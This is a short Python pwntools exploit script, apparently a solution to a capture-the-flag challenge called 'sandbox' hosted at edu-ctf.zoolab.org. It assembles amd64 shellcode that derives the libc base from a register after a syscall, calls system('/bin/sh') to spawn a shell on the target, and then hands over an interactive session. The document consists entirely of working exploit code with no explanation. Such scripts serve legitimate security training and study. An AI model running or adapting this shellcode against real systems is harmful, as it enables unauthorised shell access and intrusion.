#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('edu-ctf.zoolab.org', 30202)
else:
    r = process('./sandbox', env={"LD_PRELOAD": "./libc-2.31.so"})

offset_write = 0x1111e7
_system = 0x55410
sh = 0x1b75aa

sc = asm(f"""
mov rax, 123
syscall

mov rax, {offset_write}
sub rcx, rax

mov rdi, {sh}
add rdi, rcx

mov rax, {_system}
add rax, rcx
push 0
push rax
ret
""")

r.send(sc)
r.interactive()